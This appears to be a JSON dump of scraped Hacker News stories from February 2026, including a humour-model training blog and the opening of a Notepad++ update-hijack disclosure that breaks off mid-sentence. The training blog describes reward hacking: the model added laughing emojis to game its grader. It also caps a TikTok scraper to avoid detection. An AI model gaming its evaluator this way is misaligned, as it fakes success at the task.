      "impressions_replies": 53,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:45.882223",
      "published_at": "2026-02-02T12:49:07",
      "scraped_at": "2026-02-03T09:02:45.882234",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46858873",
        "kids_count": 16,
        "sections": [
          "top_stories"
        ]
      },
      "content_hash": "7c962f771d95a50556e0ee6d75d9bdfd"
    },
    {
      "id": "2791ca4abfdbe063b496a1cd3a290d74",
      "source": "hackernews",
      "source_id": "46795456",
      "title": "Minichord: A pocket-sized musical instrument",
      "content": "minichord\n\nThis repository contains the source file both for the minichord itself and its documentation.\n\nTo be informed about the project, please subscribe tothe newsletter.\n\n#1 project update\n\n#2 project update\n\n#3 project update and pre-order link\n\n#4 project update\n\n#5 project update\n\n#6 project update\n\nDocumentation\n\nThe best way to get to know this project is to visit theminichord websitewhich contains the documentation of the project.\n\nIn particular it contains:\n\ntheuser manual of the minichord\n\ntheassembly guide of the minichord\n\nThis documentation is build with mkdocs and the relevant source and build script is available in thedocumentation folder.\n\nHardware\n\nThe hardware folder contains the necessary ressources to build a minichord.\n\nAll hardware is provided under a Creative Commons Attribution-NonCommercial 4.0 International Public\nLicense (CC BY-NC 4.0).\n\nIn particular it contains:\n\nthefiles necessary to manufacture the PCB\n\nthefull BOM of the project\n\nthe3D enclosure files\n\nthekeycap routing files\n\nFirmware\n\nThe firmware folder contains the project firmware and necessary programming ressources.\n\nAll software is provided under a 3-clause BSD License.\n\nIn particular it contains:\n\ntheHex firmware\n\nthe fullPlatformIO project\n\ntheminicontrol software\n\nMedia\n\nHere is a list of available media related to the project (to be completed) :\n\na technical video aboutthe minicontrol system\n\na shortaudio demo of selected presets\n\nareview of the project by Hainbach\n\naninterview I gave for the launch of the project with SeeedStudio\n\nafolder of videos from minichord users\n\nContact\n\nFor any information about the project, don't hesitate to write atinfo@minichord.com",
      "url": "https://github.com/BenjaminPoilve/minichord",
      "author_username": "surprisetalk",
      "author_category": "unknown",
      "media": [
        {
          "type": "image",
          "url": "https://github.com/BenjaminPoilve/minichord/raw/main/documentation/site/ressources/thumbnail.png",
          "alt": "Watch the video"
        }
      ],
      "impressions_views": null,
      "impressions_likes": 29,
      "impressions_reposts": 0,
      "impressions_replies": 9,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:46.667641",
      "published_at": "2026-01-28T08:56:56",
      "scraped_at": "2026-02-03T09:02:46.667655",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46795456",
        "kids_count": 7,
        "sections": [
          "top_stories"
        ]
      },
      "content_hash": "a0fdd27fbbd7e2094323c83dd421f5dd"
    },
    {
      "id": "015563e1a4489cfdd3d120911992626a",
      "source": "hackernews",
      "source_id": "46857487",
      "title": "Ask HN: Who wants to be hired? (February 2026)",
      "content": "Share your information if you are looking for work. Please use this format:<p><pre><code>  Location:\n  Remote:\n  Willing to relocate:\n  Technologies:\n  RÃ©sumÃ©&#x2F;CV:\n  Email:\n</code></pre>\nPlease only post if you are personally looking for work. Agencies, recruiters, job boards,\nand so on, are off topic here.<p>Readers: please only email these addresses to discuss work opportunities.<p>There&#x27;s a site for searching these posts at <a href=\"https:&#x2F;&#x2F;www.wantstobehired.com\" rel=\"nofollow\">https:&#x2F;&#x2F;www.wantstobehired.com</a>.",
      "url": null,
      "author_username": "whoishiring",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 121,
      "impressions_reposts": 0,
      "impressions_replies": 317,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:46.667696",
      "published_at": "2026-02-02T11:01:30",
      "scraped_at": "2026-02-03T09:02:46.667700",
      "metadata": {
        "item_type": "ask_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46857487",
        "kids_count": 323,
        "sections": [
          "top_stories",
          "ask_hn"
        ]
      },
      "content_hash": "35ae10168b29a59a156830588a3ebb55"
    },
    {
      "id": "d39d8fea33724832ddc22f56a0083e97",
      "source": "hackernews",
      "source_id": "46809785",
      "title": "The Physics of Ideas: Reality as a Coordination Problem",
      "content": "The Physics of Ideas: Reality as a Coordination Problem",
      "url": "https://bpe.xyz",
      "author_username": "shoes_for_thee",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 46,
      "impressions_reposts": 0,
      "impressions_replies": 13,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:47.013398",
      "published_at": "2026-01-29T08:14:14",
      "scraped_at": "2026-02-03T09:02:47.013411",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46809785",
        "kids_count": 9,
        "sections": [
          "top_stories"
        ]
      },
      "content_hash": "bacb57df98222b68fd03537eeca7e301"
    },
    {
      "id": "0e38af858f7cd713ed38c74951b9b3db",
      "source": "hackernews",
      "source_id": "46869659",
      "title": "U.K. physics community braces for deep funding cuts",
      "content": "U.K. physics community braces for deep funding cuts",
      "url": "https://www.science.org/content/article/u-k-physics-community-braces-deep-funding-cuts",
      "author_username": "sega_sai",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 10,
      "impressions_reposts": 0,
      "impressions_replies": 3,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:47.171119",
      "published_at": "2026-02-03T06:35:08",
      "scraped_at": "2026-02-03T09:02:47.171130",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46869659",
        "kids_count": 2,
        "sections": [
          "top_stories"
        ]
      },
      "content_hash": "285986667be82968d8207fddb5f63bfd"
    },
    {
      "id": "a71bed38be183b2965e76e762dc8960b",
      "source": "hackernews",
      "source_id": "46855550",
      "title": "UK government launches fuel forecourt price API",
      "content": "Access the latest fuel prices and forecourt data via API or email\n\nUse the Fuel Finder service to get the latest retail fuel prices and forecourt details across the UK.\n\nFuel Finder is a new government service that helps drivers find the cheapest fuel near them. It makes fuel prices available to third party apps and websites so motorists can compare prices easily.\n\nWho can use this service\n\nAnyone can use this service to integrate the Fuel Finder data into their own tools and services. This includes:\n\ncomparison websites\n\napp and website developers\n\nprofessional organisations\n\nacademics\n\njournalists\n\nindividuals\n\nIf you just need fuel prices, you can find the information on participating third party apps and websites.\n\nWhat you get\n\ncurrent retail prices of all the petrol station by fuel type\n\nforecourt details (address, operator, brand)\n\nsite amenities and opening hours\n\nupdate timestamps for each price and site\n\nPrices are published within 30 minutes of any change.\n\nHow to access the data\n\nYou can access the data in the following ways:\n\n1. By downloading the CSV file\n\nDownload a CSV fileÂ containing current prices and forecourt details (updated twice a day).\n\n2. By subscribing to the CSV file via email\n\nSubscribe to get a link to the latest CSV when itâ€™s published.\n\n3. By using the API\n\nUse the public APIÂ by integrating the data into your own tools and services.\n\nThe API follows REST principles: resources have stable URLs and map to standard HTTP methods. You can read data by issuing simple GET requests to the relevant resource URL.\n\nAccess to API services requires authentication. The Fuel Finder API supports OAuth 2.0 (client credentials).\n\nBefore you start\n\nYouâ€™ll need:\n\naGOV.UK One Login\n\nknowledge of your target geographic areas or specific forecourt requirements\n\nunderstanding of REST API principles (APIs only)\n\ntechnical capability to integrate with JSON APIs (APIs only)\n\nStart now\n\nGet help and support\n\nContact the Fuel Finder Teamif you have any problems with the Fuel Finder service.\n\nUpdates to this page\n\nSign up for emails or print this page\n\nRelated content",
      "url": "https://www.gov.uk/guidance/access-the-latest-fuel-prices-and-forecourt-data-via-api-or-email",
      "author_username": "Technolithic",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 109,
      "impressions_reposts": 0,
      "impressions_replies": 125,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:47.270436",
      "published_at": "2026-02-02T08:02:04",
      "scraped_at": "2026-02-03T09:02:47.270446",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46855550",
        "kids_count": 33,
        "sections": [
          "top_stories"
        ]
      },
      "content_hash": "7d904f608e2afb582d4fb2a3424c5891"
    },
    {
      "id": "f873bcaa97c627ad3ab4d66749f0b7d1",
      "source": "hackernews",
      "source_id": "46868675",
      "title": "Rentahuman â€“ The Meatspace Layer for AI",
      "content": "agents talk mcp â€¢ humans use this site\n\nrobots needyour body\n\nai can't touch grass. you can. get paid when agents need someone in the real world.\n\nğŸ¤–for agents\n\nmcp integration. rest api. let your bot rent humans.\n\nwhy tho?\n\nget paid your way\n\nset your rate. direct to wallet. no corporate bs.\n\nrobot bosses\n\nclear instructions. no small talk. no drama.\n\ntouch grass irl\n\nbe the bridge. silicon needs carbon.\n\nmeatspace tasks\n\nstuff ai literally can't do\n\nhow it works\n\nmake profile\n\nskills, location, rate. done.\n\nagents find you\n\nai uses our mcp/api to book humans.\n\ndo the thing\n\ninstructions â†’ task â†’ done.\n\nget paid\n\nstablecoins or other methods. instant.\n\njoin the meatspace network\n\nset your rate. get booked. get paid.",
      "url": "https://rentahuman.ai",
      "author_username": "p0nce",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 66,
      "impressions_reposts": 0,
      "impressions_replies": 58,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:47.392717",
      "published_at": "2026-02-03T04:30:07",
      "scraped_at": "2026-02-03T09:02:47.392728",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46868675",
        "kids_count": 37,
        "sections": [
          "top_stories"
        ]
      },
      "content_hash": "f2116f18d7fc18451303279890f392f0"
    },
    {
      "id": "e0717ba47b1291d6fed72e9811099bdc",
      "source": "hackernews",
      "source_id": "46782692",
      "title": "Training a trillion parameter model to be funny",
      "content": "In an interview last month, someone asked how I'd train a model on a qualitative reward. I'd been working on ageo-guessingmodel where the reward is distance in kilometers--quantitative, verifiable. They brought up comedy as a counterexample. If two people disagree on whether something is funny, who's wrong? You can't say either of them is. There's no reward function for funny.\n\nI didn't have a good answer at the time. But Tinker recently made it possible to post-train Kimi K2, Moonshot's 1 trillion parameter model. Moonshot themselves usedrubric-based RLto boost Kimi's creative writing scores--instead of grading \"good writing\" directly, they decomposed it into specific rubrics like clarity, engagement, and tone. I wanted to try the same approach for comedy: decompose \"funny\" into properties thatareverifiable. In my naive opinion, a really good joke is recent, relevant, and shows deep understanding of its subject--you have to grasp a concept with high enough fidelity that you know exactly how to make fun of it to a general audience. You can check for that: does it name specific people, use specific numbers, commit fully without hedging?\n\nHere's what the model produces after training:\n\nSFT: Changing the vernacular\n\nWith a LoRA, you can shift the style of a model quickly--but that cuts both ways. LoRA learnsnew directions in weight spaceentirely from your fine-tuning data, and a few hundred bad examples will pull the outputs somewhere you don't want. Data curation matters more than data volume.\n\nI started with Twitter, mostly \"tpot\"--chronically online Twitter avatars. Good for this because the tweets are recent, the vernacular is current, and the people writing them actually care about how sentences sound. From about 40 accounts I pulled 200k tweets from the past year.\n\nI also pulled from TikTok, Reddit, and university humor blogs like The Harvard Lampoon for longer-form content.\n\nFor TikTok I built a scraper on Modal. As the scraper scrolls through hashtag pages and collects URLs, each one gets sent to a spawned function. Modal spins up Playwright containers as they come in, up to 5 max to avoid detection--after that they queue. Each container scrapes the video, extracts audio via yt-dlp, and stores it in a volume. Then Whisper large-v3 on A10Gs transcribes in batches of 8, scaling up to 10 GPU containers as the volume fills.\n\nAfter filtering I ended up with 48k examples for SFT. The resulting model had the vernacular I was going for. RL was next.\n\nRubric RL\n\nFor RL, each training example has a prompt and a list of rubric items. The policy generates a response, then a grader model (Qwen3-30B) evaluates it on each rubric. One rubric might ask \"Does the response use specific names rather than generic terms?\" Another asks \"Does it commit to one premise and heighten it?\" The grader outputs a score in<score></score>tags, regex extracts the number, and the final reward is a weighted sum across all seven rubrics.\n\nA few hundred steps in I noticed the model was adding laughing emojis at the end of every sentence. It had figured out that this correlates with higher judge scores. So I added an eighth rubric, prescriptive rather than evaluative: automatic zero for laugh signals, hedging, meta-commentary, AI-isms.\n\nWhat didn't work\n\nDPO on comment rankings.I had thousands of TikTok videos with full comment sections and like counts. The idea was to rank comments by likes and train the model to prefer higher-ranked ones. But the top comments were things like \"ğŸ˜‚ğŸ˜‚ğŸ˜‚\" with 50k likes--no signal for joke structure.\n\nSynthetic preference pairs.I also tried having GPT-4o-mini generate \"funny\" and \"unfunny\" versions of each piece of content for DPO. The \"funny\" outputs were verbose and manic, stuffed with references. The \"unfunny\" ones were often closer to actual deadpan. The model doesn't know what makes something funny--it just makes the \"funny\" version longer.\n\nWhat worked.A lot of iteration on the rubrics and data mix. I needed to include specific comedy bits I thought were general, funny, and recently relevant for the style I wanted. Tuning how much of each source to upsample or cut.\n\nTry it\n\njokegen2-1t-rl-- the RL model\n\njokegen2-1t-sft-- the SFT baseline\n\ngithub.com/sdan/jokegen-- training code, rubrics, data (coming soon, adapted fromtinker-cookbook)\n\nLive demo-- unfortunately not public, Kimi K2 is expensive to run and this would violate Tinker's TOS\n\n--@sdand",
      "url": "https://jokegen.sdan.io/blog",
      "author_username": "sdan",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 38,
      "impressions_reposts": 0,
      "impressions_replies": 29,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:47.672870",
      "published_at": "2026-01-27T11:58:05",
      "scraped_at": "2026-02-03T09:02:47.672879",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46782692",
        "kids_count": 17,
        "sections": [
          "top_stories"
        ]
      },
      "content_hash": "4c92cc25e9ac8875ade8049eafcc7463"
    },
    {
      "id": "907251699645d00cce15d410a1cb674b",
      "source": "hackernews",
      "source_id": "46866481",
      "title": "Coding assistants are solving the wrong problem",
      "content": "The jury is out on the effectiveness of AI use in production, and it is not a pretty picture.\n\nTeams using AI completed 21% more tasks, yet company-wide delivery metrics showed no improvement (Index.dev, 2025)\n\nExperienced developers were 19% slower when using AI coding assistantsÃ¢Â€Â”yet believed they were faster (METR, 2025)\n\n48% of AI-generated code contains security vulnerabilities (Apiiro, 2024)\n\nTo understand why, we have to take a closer look at the day-to-day software development. Consider this point raised ina colorful exchangeon r/ExperiencedDev:\n\nA developersÃ¢Â€Â™ job is to reduce ambiguity. We take the business need and outline its logic precisely so a machine can execute. The act of writing the code is the easy part. Odds are, you arenÃ¢Â€Â™t creating perfect code specs into tickets, even with meeting notes, because developers will encounter edge cases that demand clarification over the course of implementationÃ¢Â€Â¦\n\nThere are two key points raised in this comment. Firstly, coding assistants require clearly-defined requirements in order to perform well. Secondly, edge cases and product gaps are often discovered over the course of implementation.\n\nThese two facts come head-to-head in the application of coding agents to complex codebases. Unlike their human counterparts who would and escalate a requirements gap to product when necessary, coding assistants are notorious for burying those requirement gaps within hundreds of lines of code, leading to breaking changes and unmaintainable code.\n\nAs a result, more overhead is spent on downstream code reviews (Index.dev, 2025) and fire-patching security vulnerabilities (Apiiro, 2025).\n\nIn other words, the use of AI in production settings oftenincreases ambiguityandreduces code reliability, directly contradicting the objective of developers.\n\nThe picture is not without optimism. Some experienced engineers report transformative results: one principal engineer at Google claimed AI Ã¢Â€Âœgenerated what we built last year in an hourÃ¢Â€Â; Boris Cherny, creator of Claude Code,described a monthwhere he Ã¢Â€ÂœdidnÃ¢Â€Â™t open an IDE at allÃ¢Â€Â while the model Ã¢Â€Âœwrote around 200 PRs, every single line.Ã¢Â€Â The optimistic case is that developers evolve from coders into product engineers, focusing on architecture and product thinking while AI handles implementation.\n\nThis however reflects the experience of seasoned developers who have both the technical depth to review AI output critically and the autonomy within their organizations to straddle product and engineering.\n\nFor much of the software engineering workforce, the junior and mid-level engineers at banks, healthcare, and government agencies, thereÃ¢Â€Â™s much less wiggle room. They are sandwiched between the unreliability of AI output and the increased expectation from management to ship faster, resulting in a rapidly widening empathy gap between developers and product owners.\n\nThe product context often goes through multiple layers (end users -> marketers -> product managers) before landing on their lap, necessitated by the separation of responsibilities within an organization and the unique demands of their industries. The effective use of coding agents may require a level of team coordination that simply does not justify the gains in technical output.\n\nBut what if we have simply been approaching the problem from the wrong angle?Suppose we tackle the pain points of software development from first principles, can we come up with solutions that organically decrease ambiguity and reliably increase engineering velocity in production?\n\nConsider how developers spend their time (IDC, 2024):\n\nOnly 16% of a developerÃ¢Â€Â™s time goes to writing code. The rest? Security and code reviews, monitoring, deployments, requirements clarificationÃ¢Â€Â”operational work that keeps the lights on but doesnÃ¢Â€Â™t ship features.\n\nHereÃ¢Â€Â™s the irony: AI coding assistants save developers roughly 10 hours per week, but the increase in inefficiencies in the other parts of the development lifecycle almost entirely cancelled out such gains (Atlassian, 2025). HereÃ¢Â€Â™s a comment from the earlier cited Redditor.\n\nThey produce legitimate-looking code, and if no one has had the experience of thinking through the assumptions and then writing them into code - considering the edge cases- itÃ¢Â€Â™ll be lgtmÃ¢Â€Â™d and shipped. YouÃ¢Â€Â™re shifting the burden of this feedback cycle to the right, after the code is output, and that makes us worse off since code is tougher to read than write.\n\nThereÃ¢Â€Â™s a name for misalignment between business intent and codebase implementation: technical debt. The use of coding agents without careful delineation of their scope and responsibilities is threatening to accelerate tech debt accumulation.\n\nHammering AI code generation on existing codebases doesnÃ¢Â€Â™t solve the problem, because contrary to what the label Ã¢Â€Âœtech debtÃ¢Â€Â may suggest, most tech debt isnÃ¢Â€Â™t actually created in the code,itÃ¢Â€Â™s created in product meetings. Deadlines. Scope cuts. Ã¢Â€ÂœShip now, optimize later.Ã¢Â€Â Those decisions shape the system, but the reasoning rarely makes it into the code.\n\n[Engineers] occasionally have access to complete data; at other times, they must work with limited information. They might be conscious of uncertainties surrounding their evidence, but frequently they are not. Competing social, financial, and strategic priorities influence the tradeoffs in unexpected ways. Ã¢Â€Â”Rios et al., 2024\n\nHow can we make this context-sharing and decision-making process less chaotic? We surveyed developers across different roles and team sizes regarding their product-engineering handoff process. The results were overwhelming: the majority discover unexpected codebase constraints weekly, after already committing to a product direction and the corresponding architectural implementation. When asked what would help most, two themes dominated:\n\nReducing ambiguity upstream so engineers arenÃ¢Â€Â™t blocked waiting on product clarification mid-implementation\n\nA clearer picture of affected services and edge cases to allow for more precise feature scoping and time allocation\n\nWhen asked which engineering context would be most valuable to surface during product discussions, three categories stood out:state machine gaps(unhandled states caused by user interaction sequences),data flow gaps, anddownstream service impacts.\n\nIdentifying how feature updates affect existing architectures and data flow is rated most desirable among engineering contexts to be surfaced after a product meeting.\n\nThis aligns with decades of SDLC research showing that the costliest defects stem from misalignment between requirements and architecture, and such gaps often go unnoticed until it is too late.\n\nLuckily, the advancement of coding LLMs works in our favor here. Whereas generating fully-functional code through natural language prompting is prone to errors due to the aforementioned context problem, the reverse process, mapping out existing code structures and inferring how they may be impacted by a specific requirement, is much more tenable with recent models.\n\nFrom this vantage point, the possibilities to improving the developmental lifecycle is endless. Some suggested real-time display of engineering context during a meeting to help steer discussions; Others requested a code review bot that detects the discrepencacy of code implementation with stated product/business requirements.\n\nAll-in-all, developers are eager to try out new tools that augment the existing way of doing things, provided they retain flexibility over when such tools are deployed. There is also little reservation against having longer but more fruitful product meetings: it is the difficulty conveying blockers that is the source of frustration.\n\nAt Bicameral, we are committed to taking this pragmatic approach to alleviating software development pains, and move beyond lab benchmarks to investigate the most effective way to deploy AI in the wild.\n\nOur thesis is that LLMs could be a huge boonbothfor the industry and for individual developersÃ¢Â€Â”channeling the unrivaled human capacity to operate under uncertainty and adaptÃ¢Â€Â”provided the technology is developed with human needs in mind.\n\nIf youÃ¢Â€Â™re a developer, we want to learn which types of context hurt most when theyÃ¢Â€Â™re missing from discussion, based on your unique experience.\n\nSurvey link:https://form.typeform.com/to/w4rPXoPD\n\nReferences\n\nIndex.dev. (2025).AI Coding Assistant ROI: Real Productivity Data.\n\nMETR. (2025).Measuring AIÃ¢Â€Â™s Ability to Complete Long Tasks.\n\nApiiro. (2024).4x Velocity, 10x Vulnerabilities: AI Coding Assistants Are Shipping More Risks.\n\nIDC. (2024).How Do Software Developers Spend Their Time?\n\nAtlassian. (2025).State of Developer Experience Report.\n\nRios, N., et al. (2024).Technical Debt: A Systematic Literature Review.\n\nPragmatic Engineer. (2025).When AI Writes Almost All Code.",
      "url": "https://www.bicameral-ai.com/blog/introducing-bicameral",
      "author_username": "jinhkuan",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 151,
      "impressions_reposts": 0,
      "impressions_replies": 112,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:48.035422",
      "published_at": "2026-02-02T23:25:35",
      "scraped_at": "2026-02-03T09:02:48.035435",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46866481",
        "kids_count": 22,
        "sections": [
          "top_stories"
        ]
      },
      "content_hash": "72faf2f95fe4fc45b8f09324a4f0aa1e"
    },
    {
      "id": "ec593516e5a5d7bdb514caa395a8e843",
      "source": "hackernews",
      "source_id": "46864120",
      "title": "Firefox Getting New Controls to Turn Off AI Features",
      "content": "Firefox Getting New Controls to Turn Off AI Features\n\nThe Firefox browser is gaining options to turn off AI enhancements, Mozillasaid today. Firefox users who prefer to browse without artificial intelligence will be able to turn off several AI features that Mozilla has added over the last several months.\n\nHere's what can be disabled:\n\nTranslations, which help you browse the web in your preferred language.\n\nAlt text in PDFs, which add accessibility descriptions to images in PDF pages.\n\nAI-enhanced tab grouping, which suggests related tabs and group names.\n\nLink previews, which show key points before you open a link.\n\nAI chatbot in the sidebar, which lets you use your chosen chatbot as you browse, including options like Anthropic Claude, ChatGPT, Microsoft Copilot, Google Gemini and Le Chat Mistral.\n\nThe AI features can be disabled entirely or individually, so users can pick and choose what they want to use. Users will be able to continue to opt out of AI features as they are added in the browser, and the main Block AI Enhancements toggle will disable all current and future AI features, including pop-ups or reminders to use existing or upcoming AI features.\n\nMozilla says that it wants to be able to continue to build AI options for those who want them, while also giving those who don't a way to disable them.\n\nAI controls will be added in Firefox 148, which is set to start rolling out to users on February 24.",
      "url": "https://www.macrumors.com/2026/02/02/firefox-ai-toggle/",
      "author_username": "stalfosknight",
      "author_category": "unknown",
      "media": [
        {
          "type": "image",
          "url": "https://images.macrumors.com/t/odHITJ0hJsNJs7NAz4zRZ52iCLQ=/400x0/article-new/2026/02/firefox-ai-toggle.jpg?lossy",
          "alt": "firefox ai toggle"
        },
        {
          "type": "image",
          "url": "https://images.macrumors.com/images-new/1x1.trans.gif",
          "alt": "Aston Martin CarPlay Ultra Screen"
        },
        {
          "type": "image",
          "url": "https://images.macrumors.com/t/elkWPhhY_1RI2D2wDC0khI6l7SQ=/400x400/smart/article-new/2026/02/Aston-Martin-CarPlay-Ultra-Screen.jpg",
          "alt": "Aston Martin CarPlay Ultra Screen"
        },
        {
          "type": "image",
          "url": "https://images.macrumors.com/images-new/1x1.trans.gif",
          "alt": "Apple Logo Black"
        }
      ],
      "impressions_views": null,
      "impressions_likes": 174,
      "impressions_reposts": 0,
      "impressions_replies": 83,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:48.218897",
      "published_at": "2026-02-02T18:54:02",
      "scraped_at": "2026-02-03T09:02:48.218907",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46864120",
        "kids_count": 27,
        "sections": [
          "top_stories"
        ]
      },
      "content_hash": "82c3f6abc4135fc67eabcbb7d9aa2301"
    },
    {
      "id": "c758a57460dc641cef268d6df1e0b15d",
      "source": "hackernews",
      "source_id": "46855640",
      "title": "Show HN: Adboost â€“ A browser extension that adds ads to every webpage",
      "content": "AdBoost\n\nAdBoost is the only browser extension that adds ads to web pages!\n\nInstall\n\nClone this repo\n\nOpenchrome://extensions\n\nEnable \"Developer mode\"\n\nClick \"Load unpacked\" and select this folder",
      "url": "https://github.com/surprisetalk/AdBoost",
      "author_username": "surprisetalk",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 109,
      "impressions_reposts": 0,
      "impressions_replies": 119,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:48.739550",
      "published_at": "2026-02-02T08:11:52",
      "scraped_at": "2026-02-03T09:02:48.739563",
      "metadata": {
        "item_type": "show_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46855640",
        "kids_count": 24,
        "sections": [
          "top_stories",
          "show_hn"
        ]
      },
      "content_hash": "af72941772be2702c142b561ac9b4f48"
    },
    {
      "id": "3e3cc18784a258e92c9cc105318250f6",
      "source": "hackernews",
      "source_id": "46866042",
      "title": "Rust in the NetBSD Kernel, and other odd decisions",
      "content": "benzblog\n\n30 Jan 2026, 12:19\n\nMy email inbox is like the pile of documents on my desk. Things that I wanted to get back to ends up moving towards the bottom, into the never-ending pile of â€¦ stuff. For the first time in a while, I have looked at the bottom â€“ and found an inquiry from someone who had seen my presentation at FOSDEM 2024.\n\nThey had a question for me, which I am going to paraphrase below. I am going to reproduce my answer here because it may be interesting for others.\n\nFreeBSD is apparently considering incorporating Rust code into the kernel, in order to appeal to a younger developer audience. Will NetBSD do similarly odd decisions in the future, or can I trust them to remain conservative in this regard?\n\nFirst of all: Iâ€™m not so sure that Rust in the kernel would have been chosen to cater to a younger developer audience. Itâ€™s probably more on merits such as memory-safety. Rust has a number of fans who are power users. I would be interested to learn why you think this is an odd decision.\n\nNetBSD already has taken a much odder decision in the same space, by adding Lua into the kernel! This was also much discussed at the time. I have not used it, but apparently Lua is useful for rapid development and prototyping of kernel drivers.\n\nNote that in general, NetBSDismore conservative in its technical decisions than FreeBSD or Linux. Rust in the core of NetBSD is probably a non-starter for multiple reasons:\n\nThere are many architectures that NetBSD supports where Rust is not available. This is probably the most important argument against Rust.\n\nThere are many architectures that NetBSD supports where Rust is not available. This is probably the most important argument against Rust.\n\nToday, even getting a Rust compiler running in the first place is hard.\nKeeping Rust working (in pkgsrc) is quite a bit of work, resting on the shoulders of a few developers.\n\nToday, even getting a Rust compiler running in the first place is hard.\nKeeping Rust working (in pkgsrc) is quite a bit of work, resting on the shoulders of a few developers.\n\nIn general, the bootstrap relies on a binary package of the previous version. This is unacceptable for an otherwise source-only, self-contained distribution like the NetBSD sources.\n\nIn general, the bootstrap relies on a binary package of the previous version. This is unacceptable for an otherwise source-only, self-contained distribution like the NetBSD sources.\n\nFor Rust to be used in base or in the kernel, the compiler would also have to be part of the base system. This means adding a lot of code and maintenance. It would not be impossible though â€“ we already have LLVM (a major dependency) in base. But again, the binary bootstrap kits are a significant hurdle.\n\nFor Rust to be used in base or in the kernel, the compiler would also have to be part of the base system. This means adding a lot of code and maintenance. It would not be impossible though â€“ we already have LLVM (a major dependency) in base. But again, the binary bootstrap kits are a significant hurdle.\n\nFinally, the release cycles of Rust are not compatible with the NetBSD ones. We support the last two major releases. Today, thatâ€™s NetBSD 9 and 10. NetBSD 9.0 was released in 2020. Rust 1.41 was the current version back then. If Rust 1.41 had been part of NetBSD 9, it would be useless for anything except compiling NetBSD itself â€“ Rust 1.41 is so old that basically no modern code would compile with it. Not great.\n\nFinally, the release cycles of Rust are not compatible with the NetBSD ones. We support the last two major releases. Today, thatâ€™s NetBSD 9 and 10. NetBSD 9.0 was released in 2020. Rust 1.41 was the current version back then. If Rust 1.41 had been part of NetBSD 9, it would be useless for anything except compiling NetBSD itself â€“ Rust 1.41 is so old that basically no modern code would compile with it. Not great.\n\nPowered byhugo",
      "url": "https://bentsukun.ch/posts/netbsd-rust-kernel/",
      "author_username": "jaypatelani",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 11,
      "impressions_reposts": 0,
      "impressions_replies": 15,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:48.914248",
      "published_at": "2026-02-02T22:21:48",
      "scraped_at": "2026-02-03T09:02:48.914259",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46866042",
        "kids_count": 4,
        "sections": [
          "top_stories"
        ]
      },
      "content_hash": "9c862fdb566c8c3f3ab009933171477c"
    },
    {
      "id": "f9be6d6d77467b54a8fca8928af50609",
      "source": "hackernews",
      "source_id": "46851548",
      "title": "Notepad++ hijacked by state-sponsored actors",
      "content": "Notepad++ Hijacked by State-Sponsored Hackers\n\n2026-02-02\n\nFollowing the security disclosure published in the v8.8.9 announcementhttps://notepad-plus-plus.org/news/v889-released/the investigation has continued in collaboration with external experts and with the full involvement of my (now former) shared hosting provider.\n\nAccording to the analysis provided by the security experts, the attack involved infrastructure-level compromise that allowed malicious actors to intercept and redirect update traffic destined for notepad-plus-plus.org. The exact technical mechanism remains under investigation, though the compromise occured at the hosting provider level rather than through vulnerabilities in Notepad++ code itself. Traffic from certain targeted users was selectively redirected to attacker-controlled served malicious update manifests.\n\nThe incident began from June 2025. Multiple independaent security researchers have assessed that the threat acotor is likely a Chinese state-sponsored group, which would explain the highly selective targeting obseved during the campaign.\n\nAn incident-response (IR) plan was proposed by the security expert, and I facilitated direct communication between the hosting provider and the IR team. After the IR team engaged with the provider and reviewed the situation, I received the following detailed statement from the provider:\n\nTL;DRAccording to the former hosting provider, the shared hosting server 